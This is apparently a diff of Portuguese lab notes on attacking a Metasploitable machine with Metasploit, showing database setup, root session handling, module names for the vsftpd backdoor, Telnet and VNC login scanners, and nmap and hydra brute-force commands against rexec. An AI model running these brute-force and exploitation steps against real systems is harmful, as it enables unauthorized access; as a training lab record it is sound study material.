@@ -1,54 +1,82 @@
- Conectando no Bd (Parte mais chata)
 
+# Conectando no Banco de Dados (Parte mais chata)
+
+```bash
 sudo apt install postgresql postgresql-contrib &&
 sudo service postgresql start
 
 msfdb init
----- dentro do MSFCONSOLE
-msfconsole
-db_connect msf:msf@127.0.0.1:5432/msf
-------------------------------
-# criando workspace desse computador
-![image](https://github.com/user-attachments/assets/c79ab59f-974d-4781-bb66-693c1e4cff30)
-# serviços
-![image](https://github.com/user-attachments/assets/e2602863-3e4e-426a-a54a-eca74d17c896)
-# informaçoes de host
-![image](https://github.com/user-attachments/assets/121e0dc0-f0ed-43af-81b0-7d5af6a9aaee)
-# Procurando diretorios escondidos
-![image](https://github.com/user-attachments/assets/f4ec5416-ea24-4f5a-8234-1894a40596b9)
+```
 
-# PROFUNDANDO
-![image](https://github.com/user-attachments/assets/6bbef33c-f8f6-4ff4-aed0-ec8f4a0920d0)
-![image](https://github.com/user-attachments/assets/fdf0e3c5-cae1-4044-a42e-541c8ab3ced3)
-
-
-
-
-
-Depois de conseguir acesso como root usando o payload de:
-CRTL + Z ;
-Y ;
-
-sessions
-para acessar a sessao ;
-sessions -i 2 ;
-
-![image](https://github.com/user-attachments/assets/e4c0a2cc-9ec0-4e06-9f0f-3e3448ace42d)
-
+## Dentro do MSFCONSOLE
 
 ```bash
-meu ip: 177.67.136.88
-ip kali: 172.24.49.254
-ip meta : 192.168.100.102
+msfconsole
+db_connect msf:msf@127.0.0.1:5432/msf
+```
 
-PAYLOAD cmd/unix/interact = vsft 3.2.4
-PAYLOAD auxiliary/scanner/telnet/telnet_login = telnet 23
+---
 
-PAYLOAD scanner/vnc/vnc_login = VNC  ~~~ depois entrar com vncviewer 192.168.100.102:5900 :password
+## Criando Workspace desse Computador
 
-nmap -p 512 --script rexec-brute -v 192.168.100.102 ~~~~ pesquisar rexec_login e usar uns dos logins
+![Criando Workspace](https://github.com/user-attachments/assets/c79ab59f-974d-4781-bb66-693c1e4cff30)
 
-┌──(luan㉿192.168.100.102)-[~/Desktop/porta_512_logins]
-└─$ hydra -L /home/luan/Desktop/porta_512_logins/usuarios_512.txt -P /home/luan/Desktop/porta_512_logins/passwd_512.txt -vV 192.168.100.102 rexec
+## Serviços
 
-``` 
+![Serviços](https://github.com/user-attachments/assets/e2602863-3e4e-426a-a54a-eca74d17c896)
+
+## Informações de Host
+
+![Informações de Host](https://github.com/user-attachments/assets/121e0dc0-f0ed-43af-81b0-7d5af6a9aaee)
+
+## Procurando Diretórios Escondidos
+
+![Diretórios Escondidos](https://github.com/user-attachments/assets/f4ec5416-ea24-4f5a-8234-1894a40596b9)
+
+## Aprofundando
+
+![Profundando 1](https://github.com/user-attachments/assets/6bbef33f-f8f6-4ff4-aed0-ec8f4a0920d0)
+![Profundando 2](https://github.com/user-attachments/assets/fdf0e3c5-cae1-4044-a42e-541c8ab3ced3)
+
+---
+
+## Depois de conseguir acesso como root usando o payload:
+
+```bash
+CTRL + Z
+Y
+
+sessions        # Ver sessões ativas
+sessions -i 2   # Acessar a sessão 2
+```
+
+![Sessão](https://github.com/user-attachments/assets/e4c0a2cc-9ec0-4e06-9f0f-3e3448ace42d)
+
+---
+
+## Dados de IPs
+
+```text
+Meu IP:     177.67.136.88
+IP Kali:    172.24.49.254
+IP Meta:    192.168.100.102
+```
+
+## PAYLOADs
+
+```text
+cmd/unix/interact               => vsft 3.2.4
+auxiliary/scanner/telnet_login => Telnet porta 23
+scanner/vnc/vnc_login          => VNC (usar depois com: vncviewer 192.168.100.102:5900 :password)
+```
+
+## Força Bruta com Nmap e Hydra
+
+```bash
+nmap -p 512 --script rexec-brute -v 192.168.100.102
+
+# Depois:
+hydra -L /home/luan/Desktop/porta_512_logins/usuarios_512.txt \
+      -P /home/luan/Desktop/porta_512_logins/passwd_512.txt \
+      -vV 192.168.100.102 rexec
+```
